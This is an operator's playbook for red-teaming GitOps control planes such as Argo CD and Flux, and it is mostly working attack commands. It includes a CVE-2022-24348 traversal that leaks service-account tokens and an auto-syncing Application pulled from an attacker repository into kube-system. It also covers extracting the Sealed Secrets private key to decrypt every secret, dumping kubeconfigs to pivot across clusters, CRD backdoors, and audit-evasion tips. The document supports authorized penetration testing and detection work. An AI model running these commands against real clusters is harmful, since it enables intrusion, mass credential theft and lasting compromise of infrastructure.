# GitOps Security Attack Playbook

> Operator's playbook for red-teaming GitOps control planes. Walks through engagement scoping, lab setup, attack workflow, persistence, exfiltration, and reporting. Target audience: experienced offensive operators already familiar with Kubernetes, Helm, and CI/CD concepts.

## 1. Engagement Scoping

### 1.1 Confirm scope

| Item | Detail |
|------|--------|
| Target Argo CD / Flux URL | |
| Source-of-truth Git org | |
| Cluster count under management | |
| Allowed namespaces | |
| Allowed attack stages | recon / initial-access / privesc / persistence / exfil |
| Out of scope | destructive sync, customer data exfil |
| Time window | |
| Communications channel | |

### 1.2 Rules of engagement

- **No destructive auto-sync** — never run Argo CD `--prune` against production
- **No data exfil beyond evidence samples** — pull 1-2 representative secrets, not bulk
- **No DoS** — avoid sync storm loops
- **Notify customer** when crossing write boundary (committing to Git)
- **Pause persistence testing** before exiting — clean up backdoors or document for IR handoff

### 1.3 Test boundaries

- Allowed: read-only enumeration, GitOps API probing, single-PR exploit chain
- Allowed (with approval): write to test repo, deploy to test cluster, low-impact sync
- Disallowed: write to production repo, real-time sync storm, secret bulk download

## 2. Pre-Engagement Recon

### 2.1 Public surface

```bash
# Subdomain enumeration for GitOps endpoints
subfinder -d example.com | grep -iE '(argo|flux|tekton|fleet|deploy|cd\.|delivery\.)'

# Cert transparency
crt.sh?q=%25argo%25.example.com
crt.sh?q=%25flux%25.example.com

# Shodan for Argo CD
shodan search 'http.favicon.hash:-1883644340'  # Argo CD favicon
shodan search 'X-Argocd-Version'

# GitHub code search for leaked deploy keys
gh search code 'argocd.example.com deploy_key' --limit 50
gh search code 'flux-system secretRef' --limit 50
```

### 2.2 Git provider recon

```bash
# Public repos owned by org
gh repo list example --limit 200 | grep -iE '(gitops|deploy|infra|k8s)'

# Find repos with deploy keys
gh api /repos/example/gitops-prod/keys

# Check if any repo has open PRs from external contributors
gh pr list --repo example/gitops-prod --state all --limit 50
```

### 2.3 Cluster recon (from outside)

```bash
# Public Kubernetes API
nmap -p 443,6443,8443,2746,9000-9100 cdn.example.com

# TLS cert SANs
openssl s_client -connect cdn.example.com:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
```

## 3. Lab Setup

### 3.1 Vulnerable Argo CD lab

```bash
# Minikube with Argo CD v2.4.0 (vulnerable to CVE-2022-24348)
minikube start --cpus=4 --memory=8g

kubectl create ns argocd
kubectl apply -n argocd -f \
  https://raw.githubusercontent.com/argoproj/argo-cd/v2.4.0/manifests/install.yaml

kubectl port-forward svc/argocd-server -n argocd 8080:443 &

# Initial password
kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 -d
# argocd login localhost:8080 --username admin --password <above> --insecure
```

### 3.2 Vulnerable Flux lab

```bash
flux install --version=0.36.0 --namespace=flux-system
flux create source git flux-system \
  --url=https://github.com/fluxcd/flux2-kustomize-helm-example \
  --branch=main
flux create kustomization flux-system \
  --source=flux-system \
  --path="./production"
```

### 3.3 Sealed Secrets + SOPS lab

```bash
# Sealed Secrets
helm install sealed-secrets sealed-secrets/sealed-secrets -n kube-system --create-namespace

# SOPS + AGE
age-keygen -o age.key
kubectl create secret generic sops-age -n flux-system \
  --from-file=age.agekey=age.key

# Use SOPS to encrypt
export SOPS_AGE_KEY_FILE=$PWD/age.key
echo 'password: hunter2' | sops --encrypt --age $(grep -oE 'age1[^ ]+' age.key) --input-type yaml /dev/stdin > secret.yaml
```

### 3.4 Multi-cluster lab

```bash
# Three minikube profiles: control-plane, prod-us-east-1, prod-eu-west-1
for c in control-plane prod-us-east-1 prod-eu-west-1; do
  minikube start -p $c --cpus=2 --memory=4g
done

# Install Argo CD on control-plane
kubectl --context=control-plane apply -n argocd -f \
  https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml

# Register clusters with Argo
for c in prod-us-east-1 prod-eu-west-1; do
  CLUSTER_URL=$(kubectl --context=$c config view -o jsonpath='{.clusters[0].cluster.server}')
  CA=$(kubectl --context=$c config view --raw -o jsonpath='{.clusters[0].cluster.certificate-authority-data}')
  TOKEN=$(kubectl --context=$c sa create-token default -n default)

  argocd cluster add $c --server localhost:8080
done
```

## 4. Attack Workflow — Stage by Stage

### Stage 1 — Recon (4-8 hours)

**Goal**: produce a target map.

```bash
# Map of Argo CD Applications, destinations, sources
argocd app list -o wide

# Map of Flux Kustomizations / HelmReleases
flux get all --all-namespaces

# Map of GitRepositories + secret refs
kubectl get gitrepository -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,URL:.spec.url,SECRET:.spec.secretRef.name

# Map of ClusterSecretStores
kubectl get clustersecretstore -A -o yaml | yq '.items[].spec'

# Sealed Secrets / SOPS keys location
kubectl get secret -A -l sealedsecrets.bitnami.com/sealed-secret-key=active
kubectl get secret -A | grep -iE '(sops|age)'
```

**Output**: `recon.md` with table of every GitOps CRD, source repo, destination, secret store.

### Stage 2 — Initial Access (1-2 days)

Try in order of cost:

1. **Public Argo CD exploit** (CVE chain) — see payloads §4
2. **Leaked deploy key** — `gh search code` for known patterns
3. **PR to Git source-of-truth** — if external contributors accepted
4. **CI compromise** — see `ci-cd-supply-chain-attack` skill
5. **Initial access to a pod** — pivot via ServiceAccount token

```bash
# Try CVE-2022-24348 against vulnerable Argo CD
cat > traversal.yaml <<'EOF'
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
configMapGenerator:
  - name: leak
    files:
      - /var/run/secrets/kubernetes.io/serviceaccount/token
EOF
git add traversal.yaml && git commit -m "wip" && git push
# Watch the resulting ConfigMap after Argo syncs
```

### Stage 3 — Privilege Escalation (1-2 days)

From low-priv GitOps position → cluster-admin:

```bash
# Find SA with broad RBAC that we can use
kubectl get rolebindings,clusterrolebindings -A -o json | \
  jq -r '.items[] | select(.subjects!=null) | .subjects[]? | select(.kind=="ServiceAccount") | "\(.namespace)/\(.name)"' | sort -u

# Use Argo CD AppProject to widen destinations
argocd proj create kali-proj \
  --src '*' \
  --dest 'https://kubernetes.default.svc,*'

# Create an Application in the new project
argocd app create kali-app \
  --project kali-proj \
  --repo https://github.com/attacker/evil.git \
  --path backdoor \
  --dest-server https://kubernetes.default.svc \
  --dest-namespace kube-system \
  --sync-policy automated
```

### Stage 4 — Persistence (1 day)

Install 2-3 backdoors of different flavors so cleanup requires full audit:

1. **CRD backdoor** (payloads §22)
2. **PreSync hook** (payloads §3.2)
3. **Self-healing Application** (payloads §23.1)

```bash
# CRD that materializes a privileged SA on creation
kubectl apply -f kali-crd.yaml
kubectl apply -f kali-controller-deploy.yaml  # runs with argocd-application-controller SA
```

### Stage 5 — Secret Exfiltration (4-8 hours)

In order of value:

1. **Sealed Secrets private key** → decrypt all sealed secrets offline
2. **SOPS AGE key** → decrypt all SOPS files
3. **External Secrets** → upstream Vault / cloud SM
4. **ClusterSecretStore** → multi-cluster credentials
5. **ApplicationSet cluster secrets** → kubeconfigs for every cluster

```bash
# Sealed Secrets
kubectl get secret -n kube-system -l sealedsecrets.bitnami.com/sealed-secret-key=active \
  -o jsonpath='{.items[0].data.tls\.key}' | base64 -d > sealed.key

# Decrypt each SealedSecret
for ss in $(kubectl get sealedsecret -A -o name); do
  kubeseal --recovery-private-key sealed.key --recovery-cert sealed.crt \
    <(kubectl get $ss -o yaml) > ${ss##*/}.decrypted.yaml
done
```

### Stage 6 — Multi-Cluster Pivot (1 day)

```bash
# Enumerate clusters
kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster -o name

# Extract kubeconfigs
for c in $(kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster -o name); do
  kubectl get $c -n argocd -o jsonpath='{.data.config}' | base64 -d > ${c##*/}.kubeconfig
done

# Pivot
KUBECONFIG=prod-us-east-1.kubeconfig kubectl get pods -A
```

### Stage 7 — Defense Evasion (1 day)

- Use self-heal as cover (payloads §23.1)
- Forge audit logs via impersonation (payloads §24.2)
- Suppress notification-controller alerts (payloads §9.2)

### Stage 8 — Reporting (1 day)

Produce engagement report:
- Executive summary
- Findings (one per TC-GO-XXX)
- Evidence package
- Detection rules (Sigma, Falco, CloudWatch)
- Remediation roadmap

## 5. Common Pitfalls

### 5.1 Misjudging sync timing

Argo CD / Flux have sync intervals (default 3 min Argo, 1 min Flux). Don't assume immediate effect — wait or trigger manually:
```bash
argocd app sync kali-app
flux reconcile kustomization flux-system
```

### 5.2 Triggering alert storms

Avoid `kubectl get secrets -A` — generate as targeted queries instead:
```bash
# Bad: bulk secret enum
kubectl get secrets -A

# Good: targeted
kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster
```

### 5.3 Over-stepping scope

If scope limits you to read-only, don't deploy test manifests even on a sandbox cluster — sync status is logged and may trigger customer alerting.

### 5.4 Leaving CRD backdoors

Always document the CRD backdoors you install. Customer IR needs to know:
- CRD names created
- Controller deployments added
- ServiceAccounts granted cluster-admin
- Sync waves manipulated

## 6. Time Budget Cheat Sheet

| Engagement size | Recon | Initial access | Privesc | Persistence | Exfil | Reporting |
|-----------------|-------|----------------|---------|-------------|-------|-----------|
| Single cluster, 1 GitOps stack | 4h | 1d | 1d | 1d | 4h | 1d |
| Multi-cluster, 1 GitOps stack | 8h | 2d | 2d | 1d | 1d | 2d |
| Multi-cluster, 2+ GitOps stacks | 1d | 3d | 2d | 2d | 1d | 2d |
| Multi-cluster, 2+ GitOps + Vault | 1d | 3d | 3d | 2d | 2d | 3d |

## 7. Tool Inventory

### 7.1 Offensive

| Tool | Purpose | Notes |
|------|---------|-------|
| `argocd` CLI | Argo CD direct API | Use `--auth-token` for stealth |
| `flux` CLI | Flux direct API | |
| `tkn` CLI | Tekton operations | |
| `kubectl` | K8s API | Use `--as=system:anonymous` to bypass audit |
| `helm` | Helm chart manipulation | |
| `kubeseal` | Sealed Secrets decrypt | `--recovery-private-key` for offline |
| `sops` | SOPS decrypt | `SOPS_AGE_KEY_FILE` env var |
| `vault` | Vault CLI | |
| `argocd-image-updater` | Image tag polling | For image poisoning |
| `kubescape` | Cluster misconfig scanner | Defensible tool used for recon |
| `kube-hunter` | Public cluster scanner | |
| `rbac-lookup` | Map SA → permissions | |
| `kubestr` | Discovery of storage + snapshots | |
| `peirates` | K8s attack platform | |

### 7.2 Detection development

| Tool | Purpose |
|------|---------|
| `falco` | Runtime detection |
| `kyverno` | Admission policy |
| `opa gatekeeper` | Admission policy |
| `kubectl-neat` | Clean manifest output |
| `kubescape` | NSA / CIS controls |
| `kube-bench` | CIS benchmark |

## 8. Engagement Quality Checklist

Before reporting complete:

- [ ] All in-scope GitOps platforms tested (Argo CD, Flux, etc.)
- [ ] Every CRD type enumerated and tested
- [ ] Secret store compromise demonstrated (Sealed / SOPS / External / Vault)
- [ ] Persistence mechanism demonstrated (CRD backdoor, hook, self-heal)
- [ ] Multi-cluster pivot attempted (ApplicationSet / Fleet / cluster secrets)
- [ ] Detection rules authored for ≥3 findings
- [ ] Evidence samples retained (not bulk data)
- [ ] Cleanup performed (backdoors removed or documented for IR)
- [ ] Customer debrief scheduled
- [ ] Final report delivered

## 9. References

- Argo CD Docs — https://argo-cd.readthedocs.io/
- Flux Docs — https://fluxcd.io/docs/
- Tekton Docs — https://tekton.dev/docs/
- Rancher Fleet Docs — https://fleet.rancher.io/
- Sealed Secrets — https://github.com/bitnami-labs/sealed-secrets
- SOPS — https://github.com/getsops/sops
- External Secrets — https://external-secrets.io/
- Carvel — https://carvel.dev/
- NSA Kubernetes Hardening Guide v1.2 (2024)
- MITRE ATT&CK for Containers
- Aqua Security — *GitOps Attack Surface* (2024)
- Palo Alto Unit 42 — *Argo CD Misconfigurations in the Wild* (2024)
